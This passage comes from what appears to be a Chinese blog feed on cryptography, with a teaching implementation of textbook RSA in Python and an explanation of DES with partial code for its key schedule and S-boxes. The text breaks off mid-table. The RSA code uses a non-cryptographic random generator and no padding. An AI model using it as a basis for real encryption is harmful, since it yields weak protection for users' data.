title="完整代码"></a>完整代码</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">FastMod</span><span class="params">(x, n, m)</span>:</span></span><br><span class="line">    a = <span class="number">1</span></span><br><span class="line">    b = x</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        temp = n</span><br><span class="line">        <span class="keyword">if</span> n % <span class="number">2</span> == <span class="number">1</span> :</span><br><span class="line">            a = a * b % m</span><br><span class="line">        b = b * b % m</span><br><span class="line">        n = n//<span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> temp &lt; <span class="number">1</span> :</span><br><span class="line">            <span class="keyword">return</span> a</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">computeD</span><span class="params">(e, phi_n)</span>:</span></span><br><span class="line">    (x, y, r) = extendedGCD(phi_n, e)</span><br><span class="line">    <span class="keyword">if</span> y &lt; <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> phi_n + y</span><br><span class="line">    <span class="keyword">return</span> y</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">extendedGCD</span><span class="params">(a, b)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> b == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> (<span class="number">1</span>, <span class="number">0</span>, a)</span><br><span class="line">    x1 = <span class="number">1</span></span><br><span class="line">    y1 = <span class="number">0</span></span><br><span class="line">    x2 = <span class="number">0</span></span><br><span class="line">    y2 = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> b != <span class="number">0</span>:</span><br><span class="line">        q = a // b</span><br><span class="line">        r = a % b</span><br><span class="line">        a = b</span><br><span class="line">        b = r</span><br><span class="line">        x = x1 - q*x2</span><br><span class="line">        x1 = x2</span><br><span class="line">        x2 = x</span><br><span class="line">        y = y1 - q*y2</span><br><span class="line">        y1 = y2</span><br><span class="line">        y2 = y</span><br><span class="line">    <span class="keyword">return</span>(x1, y1, a)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">str2Hex</span><span class="params">(m)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">""</span>.join(<span class="string">"&#123;:02x&#125;"</span>.format(ord(x)) <span class="keyword">for</span> x <span class="keyword">in</span> m)</span><br><span class="line"><span class="comment"># 素性检验：采用 Miler-Rabin 检验法</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">miller_rabin</span><span class="params">(n,k=<span class="number">80</span>)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> n == <span class="number">2</span> <span class="keyword">or</span> n == <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">if</span> n % <span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    r, s = <span class="number">0</span>, n - <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> s % <span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">        r += <span class="number">1</span></span><br><span class="line">        s //= <span class="number">2</span></span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> range(k):</span><br><span class="line">        a = random.randrange(<span class="number">2</span>, n - <span class="number">1</span>)</span><br><span class="line">        x = pow(a, s, n)</span><br><span class="line">        <span class="keyword">if</span> x == <span class="number">1</span> <span class="keyword">or</span> x == n - <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">for</span> _ <span class="keyword">in</span> range(r - <span class="number">1</span>):</span><br><span class="line">            x = pow(x, <span class="number">2</span>, n)</span><br><span class="line">            <span class="keyword">if</span> x == n - <span class="number">1</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"><span class="comment"># 生成 b 位的素数</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">genPrime</span><span class="params">(b=<span class="number">1024</span>)</span>:</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="comment"># the highest bit is 1</span></span><br><span class="line">        ans = <span class="string">"1"</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(b<span class="number">-2</span>):</span><br><span class="line">            ans += str(random.randint(<span class="number">0</span>,<span class="number">1</span>))</span><br><span class="line">        <span class="comment"># the lowest bit is 1</span></span><br><span class="line">        ans += <span class="string">"1"</span></span><br><span class="line">        ans = int(ans,<span class="number">2</span>)</span><br><span class="line">        <span class="keyword">if</span> miller_rabin(ans):</span><br><span class="line">            <span class="keyword">return</span> ans</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">genE</span><span class="params">(phi_n)</span>:</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        e = genPrime(b=random.randint(<span class="number">3</span>,<span class="number">13</span>))</span><br><span class="line">        <span class="keyword">if</span> e == <span class="number">3</span> <span class="keyword">or</span> e == <span class="number">5</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span> phi_n%e != <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> e</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">RSAEncrypt</span><span class="params">(m,n,e)</span>:</span></span><br><span class="line">    m = int(str2Hex(m),<span class="number">16</span>)</span><br><span class="line">    c = pow(m,e,n)</span><br><span class="line">    <span class="keyword">return</span> c</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">RSADecrypt</span><span class="params">(c,d,n)</span>:</span></span><br><span class="line">    m = pow(c,d,n)</span><br><span class="line">    m = bytes.fromhex(<span class="string">'&#123;:x&#125;'</span>.format(m))</span><br><span class="line">    <span class="keyword">return</span> m</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment"># 生成两个大素数p和q</span></span><br><span class="line">    <span class="keyword">print</span> (<span class="string">"Generate p and q ......"</span>)</span><br><span class="line">    p = genPrime()</span><br><span class="line">    q = genPrime()</span><br><span class="line">    <span class="keyword">print</span> (<span class="string">"p = "</span>+str(p))</span><br><span class="line">    <span class="keyword">print</span> (<span class="string">"q = "</span>+str(q))</span><br><span class="line">    <span class="comment"># 计算n = p*q</span></span><br><span class="line">    n = p*q</span><br><span class="line">    <span class="keyword">print</span> (<span class="string">"n = "</span>+str(n))</span><br><span class="line">    <span class="comment"># 计算φ(n) = p*q</span></span><br><span class="line">    phi_n = (p<span class="number">-1</span>)*(q<span class="number">-1</span>)</span><br><span class="line">    <span class="keyword">print</span> (<span class="string">"\nGenerate e ......"</span>)</span><br><span class="line">    <span class="comment"># 生成一个和φ(n)互素的数e</span></span><br><span class="line">    e = genE(phi_n)</span><br><span class="line">    <span class="keyword">print</span> (<span class="string">"e = "</span>+str(e))</span><br><span class="line">    m = <span class="string">"Hello world!"</span></span><br><span class="line">    <span class="comment"># 加密算法</span></span><br><span class="line">    <span class="keyword">print</span> (<span class="string">"\n"</span>+<span class="number">8</span>*<span class="string">"*"</span>+<span class="string">" Encryption "</span>+<span class="number">8</span>*<span class="string">"*"</span>)</span><br><span class="line">    Ciphertext = RSAEncrypt(m,n,e)</span><br><span class="line">    <span class="keyword">print</span> (<span class="string">"The Ciphertext is:\n\t"</span>+str(Ciphertext))</span><br><span class="line">    <span class="comment"># 解密算法</span></span><br><span class="line">    <span class="keyword">print</span> (<span class="string">"\n"</span>+<span class="number">8</span>*<span class="string">"*"</span>+<span class="string">" Decryption "</span>+<span class="number">8</span>*<span class="string">"*"</span>)</span><br><span class="line">    <span class="comment"># 使用私钥d，d是e模φ(n)的逆</span></span><br><span class="line">    d = computeD(e,phi_n)</span><br><span class="line">    <span class="keyword">print</span> (<span class="string">"d = "</span>+str(d))</span><br><span class="line">    Plaintext = RSADecrypt(Ciphertext,d,n)</span><br><span class="line">    <span class="keyword">print</span> (<span class="string">"The Plaintext is:\n\t"</span>+str(Plaintext))</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">main()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;密码学中的RSA加密。&lt;/p&gt;
    
    </summary>
    
    
      <category term="密码学" scheme="https://1187100546.github.io/categories/%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
    
    
      <category term="密码学" scheme="https://1187100546.github.io/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
    
  </entry>
  
  <entry>
    <title>分组密码DES</title>
    <link href="https://1187100546.github.io/2020/01/03/des/"/>
    <id>https://1187100546.github.io/2020/01/03/des/</id>
    <published>2020-01-03T09:02:50.000Z</published>
    <updated>2020-01-12T10:16:59.773Z</updated>
    
    <content type="html"><![CDATA[<p>密码学中的DES加密。</p><a id="more"></a><h2 id="DES算法原理"><a href="#DES算法原理" class="headerlink" title="DES算法原理"></a>DES算法原理</h2><h3 id="基本结构"><a href="#基本结构" class="headerlink" title="基本结构"></a>基本结构</h3><p>DES是分组加密，将明文分成64位一组，密钥长度 64 比特（其中有效长度为 56 比特），8 的倍数位为奇校验位（保证每 8 位有奇数个 1）。</p><p>如图，64 比特的密钥经过置换选择和循环移位操作可生成 16 个 48 比特的子密钥。明文 m 经过初始置换 IP 后划分为左右两部分（各32 比特），经过 16 轮 Feistel 结果（其中最后一轮不做左右交换）再做一次逆置换 IP-1得到密文 c 。</p><p><img src="https://s2.ax1x.com/2020/01/12/loHUSg.png" alt="loHUSg.png"></p><p>加密方程：<br>$$<br>L_0R_0 \leftarrow IP\<br>L_n\leftarrow R_{n-1}\<br>R_n\leftarrow L_{n-1}\oplus f(R_{n-1},K_n)\<br>c=\leftarrow IP^{-1}<br>$$<br>解密方程：<br>$$<br>R_{16}L_{16}\leftarrow IP\<br>R_{n-1}\leftarrow L_n\<br>L_{n-1}\leftarrow R_n\oplus f(L_nK_n)\<br>m=IP^{-1}<br>$$<br>由此可见DES是一个对合运算。</p><h3 id="密钥扩展"><a href="#密钥扩展" class="headerlink" title="密钥扩展"></a>密钥扩展</h3><p>用于生成迭代的子密钥。具体过程为：</p><p>64位初始密钥经过置换选择1 ( PC-1 ) 后变成 56 位，经过循环左移和置换选择2 ( PC-2 ) 后分别得到 16 个 48 位子密钥 Ki 用做每一轮的迭代运算。</p><p>PC-1 去掉了校验位， PC-2 去掉了9, 18, 22, 25, 35, 38, 43, 54 位。</p><p><img src="https://s2.ax1x.com/2020/01/12/loLkes.png" alt="loLkes.png"></p><h3 id="F函数"><a href="#F函数" class="headerlink" title="F函数"></a>F函数</h3><ul><li><p>先进行E-扩展：32比特扩展为48比特</p></li><li><p>将E盒扩展得到的48位输出与子密钥𝐾𝑖进行异或运算</p></li><li><p>l压缩替换S-盒，由8个S-盒构成, 每个S-盒都是6比特的输入，4比特的输出</p></li><li><p>P-置换对8个S-盒的输出进行变换</p></li></ul><p><img src="https://s2.ax1x.com/2020/01/12/loLmWT.png" alt="loLmWT.png"></p><h2 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h2><h3 id="密钥扩展-1"><a href="#密钥扩展-1" class="headerlink" title="密钥扩展"></a>密钥扩展</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#PC-1盒</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">key_change_1</span><span class="params">(st)</span>:</span></span><br><span class="line">    key1_list = [<span class="number">57</span>,<span class="number">49</span>,<span class="number">41</span>,<span class="number">33</span>,<span class="number">25</span>,<span class="number">17</span>,<span class="number">9</span>,<span class="number">1</span>,<span class="number">58</span>,<span class="number">50</span>,<span class="number">42</span>,<span class="number">34</span>,<span class="number">26</span>,<span class="number">18</span>,<span class="number">10</span>,<span class="number">2</span>,<span class="number">59</span>,<span class="number">51</span>,<span class="number">43</span>,<span class="number">35</span>,<span class="number">27</span>,<span class="number">19</span>,<span class="number">11</span>,<span class="number">3</span>,<span class="number">60</span>,<span class="number">52</span>,<span class="number">44</span>,<span class="number">36</span>,<span class="number">63</span>,<span class="number">55</span>,<span class="number">47</span>,<span class="number">39</span>,<span class="number">31</span>,<span class="number">23</span>,<span class="number">15</span>,<span class="number">7</span>,<span class="number">62</span>,<span class="number">54</span>,<span class="number">46</span>,<span class="number">38</span>,<span class="number">30</span>,<span class="number">22</span>,<span class="number">14</span>,<span class="number">6</span>,<span class="number">61</span>,<span class="number">53</span>,<span class="number">45</span>,<span class="number">37</span>,<span class="number">29</span>,<span class="number">21</span>,<span class="number">13</span>,<span class="number">5</span>,<span class="number">28</span>,<span class="number">20</span>,<span class="number">12</span>,<span class="number">4</span>]</span><br><span class="line">    <span class="comment">#得到56位，去掉校验位</span></span><br><span class="line">    res = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> key1_list:</span><br><span class="line">        res+=st[i<span class="number">-1</span>]</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"><span class="comment">#PC-2盒</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">key_change_2</span><span class="params">(st)</span>:</span></span><br><span class="line">    key2_list = [<span class="number">14</span>,<span class="number">17</span>,<span class="number">11</span>,<span class="number">24</span>,<span class="number">1</span>,<span class="number">5</span>,<span class="number">3</span>,<span class="number">28</span>,<span class="number">15</span>,<span class="number">6</span>,<span class="number">21</span>,<span class="number">10</span>,<span class="number">23</span>,<span class="number">19</span>,<span class="number">12</span>,<span class="number">4</span>,<span class="number">26</span>,<span class="number">8</span>,<span class="number">16</span>,<span class="number">7</span>,<span class="number">27</span>,<span class="number">20</span>,<span class="number">13</span>,<span class="number">2</span>,<span class="number">41</span>,<span class="number">52</span>,<span class="number">31</span>,<span class="number">37</span>,<span class="number">47</span>,<span class="number">55</span>,<span class="number">30</span>,<span class="number">40</span>,<span class="number">51</span>,<span class="number">45</span>,<span class="number">33</span>,<span class="number">48</span>,<span class="number">44</span>,<span class="number">49</span>,<span class="number">39</span>,<span class="number">56</span>,<span class="number">34</span>,<span class="number">53</span>,<span class="number">46</span>,<span class="number">42</span>,<span class="number">50</span>,<span class="number">36</span>,<span class="number">29</span>,<span class="number">32</span>]</span><br><span class="line">    <span class="comment">#压缩置换</span></span><br><span class="line">    <span class="comment">#去掉9，18，22，25，35，38，43，54位得到48位</span></span><br><span class="line">    res = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> key2_list:</span><br><span class="line">        res+=st[i<span class="number">-1</span>]</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"><span class="comment">#16轮迭代生成子密钥</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">key_gen</span><span class="params">(st)</span>:</span></span><br><span class="line">    key_list = []<span class="comment">#子密钥表</span></span><br><span class="line">    key_change_res = key_change_1(st)</span><br><span class="line">    <span class="comment">#PC-1置换分成C，D两块</span></span><br><span class="line">    key_c = key_change_res[<span class="number">0</span>:<span class="number">28</span>]</span><br><span class="line">    key_d = key_change_res[<span class="number">28</span>:]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">17</span>): <span class="comment">#共16轮</span></span><br><span class="line">        <span class="keyword">if</span> (i==<span class="number">1</span>) <span class="keyword">or</span> (i==<span class="number">2</span>) <span class="keyword">or</span> (i==<span class="number">9</span>) <span class="keyword">or</span> (i==<span class="number">16</span>):<span class="comment">#按轮数循环左移</span></span><br><span class="line">            key_c = zuoyiwei(key_c,<span class="number">1</span>)</span><br><span class="line">            key_d = zuoyiwei(key_d,<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            key_c = zuoyiwei(key_c,<span class="number">2</span>)</span><br><span class="line">            key_d = zuoyiwei(key_d,<span class="number">2</span>)</span><br><span class="line">        key_yiwei = key_c+key_d</span><br><span class="line">        <span class="comment">#压缩置换</span></span><br><span class="line">        key_res = key_change_2(key_yiwei)</span><br><span class="line">        key_list.append(key_res)</span><br><span class="line"><span class="keyword">return</span> key_list</span><br></pre></td></tr></table></figure><h3 id="F函数-1"><a href="#F函数-1" class="headerlink" title="F函数"></a>F函数</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#E盒扩展置换，将32位输出扩展至48位</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">box_e</span><span class="params">(st)</span>:</span></span><br><span class="line">    <span class="comment">#E盒置换表</span></span><br><span class="line">    e_list = [<span class="number">32</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">13</span>,<span class="number">12</span>,<span class="number">13</span>,<span class="number">14</span>,<span class="number">15</span>,<span class="number">16</span>,<span class="number">17</span>,<span class="number">16</span>,<span class="number">17</span>,<span class="number">18</span>,<span class="number">19</span>,<span class="number">20</span>,<span class="number">21</span>,<span class="number">20</span>,<span class="number">21</span>,<span class="number">22</span>,<span class="number">23</span>,<span class="number">24</span>,<span class="number">25</span>,<span class="number">24</span>,<span class="number">25</span>,<span class="number">26</span>,<span class="number">27</span>,<span class="number">28</span>,<span class="number">29</span>,<span class="number">28</span>,<span class="number">29</span>,<span class="number">30</span>,<span class="number">31</span>,<span class="number">32</span>,<span class="number">1</span>]</span><br><span class="line">    res = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> e_list:</span><br><span class="line">        res +=st[i<span class="number">-1</span>]</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"><span class="comment">#S盒代换盒</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">box_s</span><span class="params">(st)</span>:</span></span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    <span class="comment">#8个S盒代换表</span></span><br><span class="line">    s_list = [[<span class="number">14</span>,<span class="number">4</span>,<span class="number">13</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">15</span>,<span class="number">11</span>,<span class="number">8</span>,<span class="number">3</span>,<span class="number">10</span>,<span class="number">6</span>,<span class="number">12</span>,<span class="number">5</span>,<span class="number">9</span>,<span class="number">0</span>,<span class="number">7</span>,<span class="number">0</span>,<span class="number">15</span>,<span class="number">7</span>,<span class="number">4</span>,<span class="number">14</span>,<span class="number">2</span>,<span class="number">13</span>,<span class="number">1</span>,<span class="number">10</span>,<span class="number">6</span>,<span class="number">12</span>,<span class="number">11</span>,<span class="number">9</span>,<span class="number">5</span>,<span class="number">3</span>,<span class="number">8</span>,<span class="number">4</span>,<span class="number">1</span>,<span class="number">14</span>,<span class="number">8</span>,<span class="number">13</span>,<span class="number">6</span>,<span class="number">2</span>,<span class="number">11</span>,<span class="number">15</span>,<span class="number">12</span>,<span class="number">9</span>,<span class="number">7</span>,<span class="number">3</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">0</span>,<span class="number">15</span>,<span class="number">12</span>,<span class="number">8</span>,<span class="number">2</span>,<span class="number">4</span>,<span class="number">9</span>,<span class="number">1</span>,<span class="number">7</span>,<span class="number">5</span>,<span class="number">11</span>,<span class="number">3</span>,<span class="number">14</span>,<span class="number">10</span>,<span class="number">0</span>,<span class="number">6</span>,<span class="number">13</span>],</span><br><span class="line">              [<span class="number">15</span>,<span class="number">1</span>,<span class="number">8</span>,<span class="number">14</span>,<span class="number">6</span>,<span class="number">11</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">9</span>,<span class="number">7</span>,<span class="number">2</span>,<span class="number">13</span>,<span class="number">12</span>,<span class="number">0</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">3</span>,<span class="number">13</span>,<span class="number">4</span>,<span class="number">7</span>,<span class="number">15</span>,<span class="number">2</span>,<span class="number">8</span>,<span class="number">14</span>,<span class="number">12</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">10</span>,<span class="number">6</span>,<span class="number">9</span>,<span class="number">11</span>,<span class="number">5</span>,<span class="number">0</span>,<span class="number">14</span>,<span class="number">7</span>,<span class="number">11</span>,<span class="number">10</span>,<span class="number">4</span>,<span class="number">13</span>,<span class="number">1</span>,<span class="number">5</span>,<span class="number">8</span>,<span class="number">12</span>,<span class="number">6</span>,<span class="number">9</span>,<span class="number">3</span>,<span class="number">2</span>,<span class="number">15</span>,<span class="number">13</span>,<span class="number">8</span>,<span class="number">10</span>,<span class="number">1</span>,<span class="number">3</span>,<span class="number">15</span>,<span class="number">4</span>,<span class="number">2</span>,<span class="number">11</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">12</span>,<span class="number">0</span>,<span class="number">5</span>,<span class="number">14</span>,<span class="number">9</span>],</span><br><span class="line">              [<span class="number">10</span>,<span class="number">0</span>,<span class="number">9</span>,<span class="number">14</span>,<span class="number">6</span>,<span class="number">3</span>,<span class="number">15</span>,<span class="number">5</span>,<span class="number">1</span>,<span class="number">13</span>,<span class="number">12</span>,<span class="number">7</span>,<span class="number">11</span>,<span class="number">4</span>,<span class="number">2</span>,<span class="number">8</span>,<span class="number">13</span>,<span class="number">7</span>,<span class="number">0</span>,<span class="number">9</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">6</span>,<span class="number">10</span>,<span class="number">2</span>,<span class="number">8</span>,<span class="number">5</span>,<span class="number">14</span>,<span class="number">12</span>,<span class="number">11</span>,<span class="number">15</span>,<span class="number">1</span>,<span class="number">13</span>,<span class="number">6</span>,<span class="number">4</span>,<span class="number">9</span>,<span class="number">8</span>,<span class="number">15</span>,<span class="number">3</span>,<span class="number">0</span>,<span class="number">11</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">12</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">14</span>,<span class="number">7</span>,<span class="number">1</span>,<span class="number">10</span>,<span class="number">13</span>,<span class="number">0</span>,<span class="number">6</span>,<span class="number">9</span>,<span class="number">8</span>,<span class="number">7</span>,<span class="number">4</span>,<span class="number">15</span>,<span class="number">14</span>,<span class="number">3</span>,<span class="number">11</span>,<span class="number">5</span>,<span class="number">2</span>,<span class="number">12</span>],</span><br><span class="line">              [<span class="number">7</span>,<span class="number">13</span>,<span class="number">14</span>,<span class="number">3</span>,<span class="number">0</span>,<span class="number">6</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">8</span>,<span class="number">5</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">4</span>,<span class="number">15</span>,<span class="number">13</span>,<span class="number">8</span>,<span class="number">11</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">15</span>,<span class="number">0</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">7</span>,<span class="number">2</span>,<span class="number">12</span>,<span class="number">1</span>,<span class="number">10</span>,<span class="number">14</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">6</span>,<span class="number">9</span>,<span class="number">0</span>,<span class="number">12</span>,<span class="number">11</span>,<span class="number">7</span>,<span class="number">13</span>,<span class="number">15</span>,<span class="number">1</span>,<span class="number">3</span>,<span class="number">14</span>,<span class="number">5</span>,<span class="number">2</span>,<span class="number">8</span>,<span class="number">4</span>,<span class="number">3</span>,<span class="number">15</span>,<span class="number">0</span>,<span class="number">6</span>,<span class="number">10</span>,<span class="number">1</span>,<span class="number">13</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">7</span>,<span class="number">2</span>,<span class="number">14</span>],</span><br><span class="line">              [<span class="number">2</span>,<span class="number">12</span>,<span class="number">4</span>,<span class="number">1</span>,<span class="number">7</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">6</span>,<span class="number">8</span>,<span class="number">5</span>,<span class="number">3</span>,<span class="number">15</span>,<span class="number">13</span>,<span class="number">0</span>,<span class="number">14</span>,<span class="number">9</span>,<span class="number">14</span>,<span class="number">11</span>,<span class="number">2</span>,<span class="number">12</span>,<span class="number">4</span>,<span class="number">7</span>,<span class="number">13</span>,<span class="number">1</span>,<span class="number">5</span>,<span class="number">0</span>,<span class="number">15</span>,<span class="number">10</span>,<span class="number">3</span>,<span class="number">9</span>,<span class="number">8</span>,<span class="number">6</span>,<span class="number">4</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">11</span>,<span class="number">10</span>,<span class="number">13</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">15</span>,<span class="number">9</span>,<span class="number">12</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">3</span>,<span class="number">0</span>,<span class="number">14</span>,<span class="number">11</span>,<span class="number">8</span>,<span class="number">12</span>,<span class="number">7</span>,<span class="number">1</span>,<span class="number">14</span>,<span class="number">2</span>,<span class="number">13</span>,<span class="number">6</span>,<span class="number">15</span>,<span class="number">0</span>,<span 